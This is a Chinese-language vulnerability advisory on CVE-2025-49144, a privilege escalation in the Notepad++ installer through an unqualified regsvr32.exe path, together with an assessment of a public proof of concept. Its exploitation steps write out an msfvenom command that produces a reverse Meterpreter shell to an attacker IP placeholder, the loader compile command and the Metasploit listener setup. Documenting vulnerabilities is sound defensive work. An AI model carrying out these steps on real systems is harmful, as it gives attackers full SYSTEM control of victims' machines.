## CVE-2025-49144 - Notepad++ 权限提升 (Privilege Escalation)

**漏洞编号:** CVE-2025-49144

**漏洞类型:** 权限提升 (Privilege Escalation)

**影响应用:** Notepad++

**危害等级:** 高危

**CVSS评分:** Awaiting Analysis

**影响版本:** v8.8.1 及更早版本

**利用条件:** 本地攻击、需要用户交互 (运行安装程序)、社会工程学/点击劫持诱骗用户

**POC 可用性:** 9/10

**POC 类型:** 完整利用 (Full Exploit)

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-49144 是 Notepad++ 开源文本编辑器在版本 8.8.1 及之前版本安装程序中发现的一个高危本地权限提升漏洞。该漏洞源于安装程序在调用 `regsvr32.exe` 等组件时，未指定完整的路径（例如 `C:\Windows\System32\regsvr32.exe`），而是直接调用 `regsvr32.exe`。当一个可执行文件在没有完整路径的情况下被启动时，Windows 系统会按照特定的搜索顺序查找该文件，其中优先级最高的搜索路径之一就是当前应用程序启动所在的文件夹。这意味着如果攻击者能够诱骗用户将恶意可执行文件（例如伪装成 `regsvr32.exe`）放置在与合法 Notepad++ 安装程序相同的目录下（如用户的“下载”文件夹），并在用户运行安装程序时，系统将以安装程序的 SYSTEM 权限加载并执行恶意文件，从而使攻击者获得目标机器的完全控制权。此漏洞威胁用户数据和系统安全，利用方式通常涉及社会工程学或点击劫持等手段，诱使用户下载和执行受感染的文件。

**POC有效性分析**
提供的POC（`notepad-v8.8.1-LPE-CVE-`）是一个高度有效且功能完整的利用示例。该POC详细解释了漏洞的原理，即通过路径劫持（uncontrolled executable search path）实现权限提升。它清晰地阐述了Windows的可执行文件搜索顺序，并指出恶意 `regsvr32.exe` 文件如何能优先于系统合法的 `regsvr32.exe` 被加载。POC提供了从零开始构建恶意负载的完整步骤：首先，使用 `msfvenom` 工具生成 Meterpreter shellcode；其次，提供了一个名为 `regsvr32_loader.c` 的C语言加载器代码，用户需将生成的shellcode粘贴到其中；接着，指导用户使用 `x86_64-w64-mingw32-gcc` 编译器将 `regsvr32_loader.c` 编译为恶意的 `regsvr32.exe` 文件；最后，详细说明如何设置 Metasploit 监听器，并在受害者机器上将编译后的 `regsvr32.exe` 与易受攻击的 Notepad++ 安装程序（例如 v8.6.8 版本）放置在同一目录下，运行安装程序即可触发。整个过程逻辑严谨，步骤明确，工具链标准，且指明了测试所使用的具体易受攻击版本，极大提高了POC的可复现性和有效性。该POC不仅证明了漏洞的存在，还提供了实际利用的完整流程。

**利用步骤**
1.  **生成Shellcode**: 使用 `msfvenom` 工具生成一个反向 Meterpreter TCP shellcode。例如：`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f c > shellcode.txt`。
2.  **准备恶意加载器**: 下载 `regsvr32_loader.c` 文件，并将 `shellcode.txt` 中生成的完整shellcode粘贴到 `regsvr32_loader.c` 中指定位置。
3.  **编译恶意文件**: 使用 `x86_64-w64-mingw32-gcc` 编译器将 `regsvr32_loader.c` 编译为 `regsvr32.exe`。例如：`x86_64-w64-mingw32-gcc regsvr32_loader.c -o regsvr32.exe -mwindows`。
4.  **设置监听器**: 在攻击者机器上启动 `msfconsole`，配置 `exploit/multi/handler` 模块，设置 `payload windows/x64/meterpreter/reverse_tcp`，并指定正确的 `LHOST` 和 `LPORT`。
5.  **部署恶意负载**: 将编译好的 `regsvr32.exe` 文件移动到受害者 Windows 系统上，与易受攻击的 Notepad++ 安装程序（例如 v8.6.8 版本）处于同一文件夹（通常是“下载”文件夹）。
6.  **执行安装程序**: 受害者运行 Notepad++ 安装程序。在安装过程中，系统会以 SYSTEM 权限加载并执行同目录下的恶意 `regsvr32.exe`，从而建立Meterpreter会话。

**投毒风险分析**
本POC在内容上是清晰、透明且专注于漏洞演示的，其投毒风险评估为低。POC的README文件明确说明了漏洞原理、工作方式以及重现步骤。它指导用户通过标准且公开可用的工具（如 `msfvenom`、`mingw32-gcc`、`Metasploit`）来生成和编译恶意负载。POC中提到的 `regsvr32_loader.c` 文件（作为示例代码）是用于加载并执行 shellcode 的，这是典型的漏洞利用 payload 构建方式，其功能在安全研究领域是已知且常见的。该POC没有表现出任何代码混淆、包含未声明的外部脚本、或执行超出其明确目的的恶意行为。它的核心目的是帮助安全研究人员理解并复现一个特定的权限提升漏洞，而不是悄悄地植入后门或进行其他未授权操作。因此，对于遵循其明确指令进行测试的安全专业人员而言，只要在受控环境中（如虚拟机）操作并对所生成代码有基本理解，使用此POC进行防御性研究的风险是可控且极低的。POC本身不含恶意投毒代码，而是指导用户合法地创建用于漏洞利用的测试样本。

**项目地址:** https://github.com/Chitrank02/notepad-v8.8.1-LPE-CVE-2025-49144

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49144
